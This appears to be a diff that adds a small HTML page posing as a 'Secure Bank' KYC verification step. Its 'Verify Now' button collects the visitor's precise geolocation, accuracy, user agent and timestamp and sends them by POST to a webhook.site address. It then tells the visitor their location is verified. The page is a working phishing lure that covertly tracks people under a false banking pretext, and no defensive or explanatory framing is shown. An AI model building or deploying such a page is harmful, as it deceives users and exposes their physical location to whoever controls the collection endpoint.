@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>KYC Verification - Secure Bank</title>
+  <style>
+    body {
+      background: #f4f4f4;
+      font-family: Arial, sans-serif;
+      padding: 40px;
+    }
+
+    .card {
+      background: white;
+      max-width: 400px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+
+    .card h2 {
+      text-align: center;
+      color: #2e6da4;
+    }
+
+    .card p {
+      text-align: center;
+      color: #666;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background: #2e6da4;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    #status {
+      margin-top: 15px;
+      text-align: center;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>KYC Verification</h2>
+    <p>To verify your account, please confirm your location.</p>
+    <button onclick="getLocation()">Verify Now</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        document.getElementById("status").innerText = "Verifying location...";
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+          };
+
+          fetch("https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+          });
+
+          document.getElementById("status").innerText = "Location verified.";
+        }, function(error) {
+          document.getElementById("status").innerText = "Location access denied.";
+        });
+      } else {
+        document.getElementById("status").innerText = "Geolocation not supported.";
+      }
+    }
+  </script>
+</body>
+</html>
